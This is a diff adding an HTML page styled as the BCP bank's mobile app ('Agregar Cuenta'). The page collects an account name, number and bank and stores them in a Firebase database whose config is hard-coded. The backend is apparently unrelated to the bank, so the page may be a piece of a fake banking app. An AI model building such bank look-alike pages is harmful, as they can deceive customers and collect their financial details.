@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Agregar Cuenta - Banca Móvil BCP</title>
+<link rel="manifest" href="manifest.json" />
+  <meta name="theme-color" content="#0003ff" />
+
+  <!-- Favicon -->
+  <link rel="icon" type="images/png" href="images/app_icon_xxxhdpi.png"> 
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+  body{
+    background:#f6f8ff;
+    color:#00246f;
+    min-height:100vh;
+  }
+
+  header{
+    background:#0033a0;
+    color:#fff;
+    text-align:center;
+    padding:16px;
+    font-size:18px;
+    font-weight:600;
+    position:relative;
+  }
+  header button{
+    position:absolute;
+    left:12px;top:50%;
+    transform:translateY(-50%);
+    background:none;
+    border:none;
+    cursor:pointer;
+  }
+  header button img{width:22px;height:22px;}
+
+  .container{
+    padding:24px 18px;
+    max-width:400px;
+    margin:auto;
+  }
+
+  h2{
+    text-align:center;
+    margin-bottom:20px;
+    color:#0033a0;
+  }
+
+  label{
+    display:block;
+    font-size:14px;
+    margin-bottom:6px;
+    font-weight:500;
+  }
+
+  input, select{
+    width:100%;
+    padding:10px 12px;
+    font-size:14px;
+    border:1px solid #ccc;
+    border-radius:8px;
+    margin-bottom:16px;
+    outline:none;
+  }
+  input:focus, select:focus{
+    border-color:#0033a0;
+  }
+
+  button.enviar{
+    width:100%;
+    background:#ff6600;
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    padding:12px;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+    transition:0.2s;
+  }
+  button.enviar:hover{background:#e65c00;}
+
+  .nota{
+    font-size:13px;
+    color:#555;
+    margin-top:10px;
+    line-height:1.5;
+    background:#fff;
+    padding:12px;
+    border-radius:8px;
+    border-left:4px solid #ff6600;
+  }
+  .nota strong{color:#c00;}
+
+  /* ===== MODAL ===== */
+  .modal{
+    position:fixed;
+    top:0;left:0;
+    width:100%;height:100%;
+    background:rgba(0,0,0,0.5);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    visibility:hidden;
+    opacity:0;
+    transition:0.3s ease;
+  }
+  .modal.show{
+    visibility:visible;
+    opacity:1;
+  }
+  .modal-content{
+    background:#fff;
+    width:90%;
+    max-width:350px;
+    border-radius:14px;
+    padding:22px 18px;
+    text-align:center;
+    box-shadow:0 6px 18px rgba(0,0,0,0.15);
+    animation:slideIn 0.3s ease;
+  }
+  @keyframes slideIn{
+    from{transform:translateY(-30px);opacity:0;}
+    to{transform:translateY(0);opacity:1;}
+  }
+  .modal-content h3{
+    color:#0033a0;
+    margin-bottom:10px;
+  }
+  .modal-content p{
+    font-size:14px;
+    color:#333;
+    margin-bottom:8px;
+  }
+  .modal-content button{
+    margin-top:16px;
+    background:#ff6600;
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    padding:10px 20px;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+  }
+  .modal-content button:hover{
+    background:#e65c00;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <button onclick="history.back()"><img src="images/atras.svg" alt="Volver"></button>
+  Agregar Cuenta
+</header>
+
+<main class="container">
+  <h2>Nueva Cuenta</h2>
+
+  <form id="formCuenta">
+    <label for="nombre">Nombre de la cuenta</label>
+    <input type="text" id="nombre" placeholder="Ej: Cuenta de ahorros" required>
+
+    <label for="numero">Número de cuenta</label>
+    <input type="text" id="numero" placeholder="Ej: 57050205129366" required>
+
+    <label for="banco">Banco</label>
+    <select id="banco" required>
+      <option value="">Selecciona un banco</option>
+      <option value="BCP">BCP</option>
+      <option value="Interbank">Interbank</option>
+      <option value="BBVA">BBVA</option>
+      <option value="Scotiabank">Scotiabank</option>
+      <option value="BanBif">BanBif</option>
+    </select>
+
+    <button type="submit" class="enviar">Guardar Cuenta</button>
+  </form>
+
+  <div class="nota">
+    <p><strong>IMPORTANTE:</strong> Ingresa el número de cuenta completo, sea bancario o interbancario.</p>
+    <p>Recuerda que el uso incorrecto de este apartado puede traer como consecuencia el <strong>baneo permanente</strong> en la aplicación sin derecho a reclamo.</p>
+  </div>
+</main>
+
+<!-- MODAL -->
+<div class="modal" id="modalExito">
+  <div class="modal-content">
+    <h3>✅ Datos guardados</h3>
+    <p><strong>Nombre:</strong> <span id="mNombre"></span></p>
+    <p><strong>Cuenta:</strong> <span id="mCuenta"></span></p>
+    <p><strong>Banco:</strong> <span id="mBanco"></span></p>
+    <button id="btnCerrar">Aceptar</button>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDvfMTYu_d_Vl0z-3Y8ld_YtcFLGgZmP0U",
+    authDomain: "bcpf-e0a42.firebaseapp.com",
+    databaseURL: "https://bcpf-e0a42-default-rtdb.firebaseio.com",
+    projectId: "bcpf-e0a42",
+    storageBucket: "bcpf-e0a42.firebasestorage.app",
+    messagingSenderId: "1030005921701",
+    appId: "1:1030005921701:web:0c15124cadf030280f7a4c"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  const form = document.getElementById("formCuenta");
+  const modal = document.getElementById("modalExito");
+  const btnCerrar = document.getElementById("btnCerrar");
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const nombre = document.getElementById("nombre").value.trim();
+    const numero = document.getElementById("numero").value.trim();
+    const banco = document.getElementById("banco").value;
+
+    if (!nombre || !numero || !banco) return alert("Por favor completa todos los campos.");
+
+    try {
+      const nuevaRef = push(ref(db, "cuentas"));
+      await set(nuevaRef, { nombre, numero, banco, creado: new Date().toISOString() });
+
+      // Mostrar modal con los datos
+      document.getElementById("mNombre").textContent = nombre;
+      document.getElementById("mCuenta").textContent = numero;
+      document.getElementById("mBanco").textContent = banco;
+      modal.classList.add("show");
+
+      form.reset();
+    } catch (error) {
+      console.error("Error al guardar:", error);
+      alert("Ocurrió un error al guardar los datos.");
+    }
+  });
+
+  btnCerrar.addEventListener("click", () => {
+    modal.classList.remove("show");
+  });
+</script>
+</body>
+</html>
